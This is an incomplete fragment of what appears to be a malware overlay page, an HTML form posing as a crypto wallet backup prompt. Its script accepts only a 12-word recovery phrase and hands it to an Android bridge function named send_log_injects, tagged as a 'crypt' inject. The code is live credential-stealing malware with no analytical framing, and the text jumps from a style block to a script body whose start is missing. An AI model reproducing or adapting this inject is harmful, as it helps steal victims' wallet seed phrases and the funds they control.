    <style>
        body {
            background-color: #f6f6f6;
        }

        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            flex: 1;
        }

        .formBlock {
            background-color: #fff;
            padding: 15px;
            border-bottom: 2px solid #eaeaea;
        }

        footer {
            border-bottom: 30px solid #a4a8a9;
            background-color: #c8ccce;
        }

        label {
            font-weight: 600;
            font-size: 22px;
            color: #1d1e1f;
        }

        .input {
            width: 100%;
            padding: 5px;
            padding: left;
            border: 0;
            border-bottom: 1px solid #9e9e9e;
        }

        .input:focus {
            border-bottom: 2px solid #563daf;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        .button {
            border: 0;
            background-color: transparent;
            padding: 10px;
            float: right;
            font-size: 18px;
            font-weight: 600;
            color: #563daf;
        }

        .button:disabled {
            color: #fff;
        }
    </style>
</head>

            if(backup.value.split(" ").length <= 11 || backup.value.split(" ").length > 12) {
                sendData.disabled = true
            } else if (backup.value.split(" ").length == 12){
                sendData.disabled = false
            }
        }

        sendData.onclick = () => {
            var data = {};
                data.backup = backup.value;
                data.type_injects = "crypt";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
